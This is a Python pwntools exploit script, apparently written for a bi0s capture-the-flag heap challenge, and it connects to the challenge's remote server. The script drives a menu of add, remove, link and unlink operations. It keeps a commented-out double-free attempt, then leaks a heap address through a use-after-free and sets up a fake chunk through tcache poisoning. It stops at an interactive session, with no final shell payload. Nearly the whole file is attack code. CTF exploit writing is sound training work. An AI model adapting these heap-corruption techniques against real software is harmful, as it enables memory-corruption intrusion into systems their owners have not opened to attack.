#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("pwn.challenge.bi0s.in", 1234)

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def _check_result():
    res = io.recvline().strip()
    if res == b"Success":
        return True

    return False

def _view(view=False):
    while True:
        res = io.recvline(timeout=0.5)
        if not res:
            break
        if not view:
            continue
        print(res)

def add(data, size):
    log.info(f"Adding data: {data} of size: {size}")
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", data)
    return _check_result()

def remove(index, offset, view=False):
    log.info(f"Removing offset: {offset} from index: {index}")
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b": ", str(index).encode())
    _view(view=False)

    io.recvuntil(b") ")
    io.sendline(str(offset).encode())
    return _check_result()

def link(to_idx, from_idx):
    log.info(f"Linking index: {from_idx} to idx: {to_idx}")
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b": ", str(to_idx).encode())
    io.sendlineafter(b": ", str(from_idx).encode())
    return _check_result()

def unlink(index, offset, keep=b"y"):
    log.info(f"Unlinking index: {index} at offset: {offset}")
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b": ", str(index).encode())
    _view()
    io.recvuntil(b": ")
    io.sendline(str(offset).encode())
    io.recvuntil(b"? ")
    io.sendline(keep)
    return _check_result()

def exit():
    io.sendlineafter(b">> ", b"5")


io = start()

################################################################################
# DOUBLE FREE
################################################################################

# size=0x10
# add(b"A"*size, size) # 0
# add(b"B"*size, size) # 1
# add(b"C"*size, size) # 2
# add(b"D"*size, size) # 3

# for i in range(3):
#     add(b"E"*size, size)

# for i in range(3):
#     remove(4+i, 1)

# # 6 chunks in tcache

# link(2, 3) # 2 -> 3
# link(1, 2) # 1 -> 2 -> 3
# link(0, 1) # 0 -> 1 -> 2 -> 3

# unlink(0, 3) # 0 -> 1 -> 3, 2 -> 3
# remove(0, 3) # 0 -> 1, 3->data in tcache, &3 in fastbins

# add(b"F"*size, size) # 2

# remove(1, 1337) # free(2), free(3) -> in fastbins X <-> Y

# for i in range(3):
#     add(b"G"*size, size)

# # 6 chunks in tcache

# add(b"H"*0x20, 0x20) # tcache empty, fastbins fucked up
# add(b"H"*0x20, 0x20)

################################################################################
# LEAK HEAP
################################################################################

add(b"A"*0x10, 0x10)
add(b"B"*0x10, 0x10)
add(b"C"*0x10, 0x10)
add(b"D"*0x10, 0x10)

link(2, 3) # 2 -> 3
link(1, 2) # 1 -> 2 -> 3
link(0, 1) # 0 -> 1 -> 2 -> 3

# Table
# idx 0: 0 -> 1 ----|
# idx 1: 2 -------> 3
unlink(0, 3) # 0 -> 1 -> 3, 2 -> 3
# Table
# idx 0: 0 -> 1 ----|
# idx 1: 2 (free),  3 (free)
remove(1, 1337) # 0 -> 1 -> 3 (freed), 0 (freed)

add(b"", 0x10) # tcache returns 3, and I have pointer to it
link(0, 1)

io.sendlineafter(b">> ", b"2")
io.sendlineafter(b": ", b"0")
io.recvuntil(b"4 : ")
leak = io.recvline().strip()
leak = u64(leak.ljust(8, b"\x00")) - 0x360
log.success(f"Got leak! {hex(leak)}")
io.recvuntil(b") ")
io.sendline(b"2")
remove(0, 1)
unlink(0, 1)
remove(0, 1)

################################################################################
# FAKE CHUNK
################################################################################

add(p64(leak + 0x340), 0x10)
add(b"B"*0x10, 0x10)
add(b"C"*0x10, 0x10)
add(b"D"*0x10, 0x10)

link(3, 4) # 2 -> 3
link(2, 3) # 1 -> 2 -> 3
link(0, 2) # 0 -> 1 -> 2 -> 3

# Table
# idx 0: 0 -> 1 ----|
# idx 1: 2 -------> 3
unlink(0, 3) # 0 -> 1 -> 3, 2 -> 3
# Table
# idx 0: 0 -> 1 ----|
# idx 1: 2 (free),  3 (free)
remove(2, 1337) # 0 -> 1 -> 3 (freed), 0 (freed)

add(b"", 0x18) # tcache returns 3, and I have pointer to it
link(0, 2)
link(0, 1)

io.interactive()

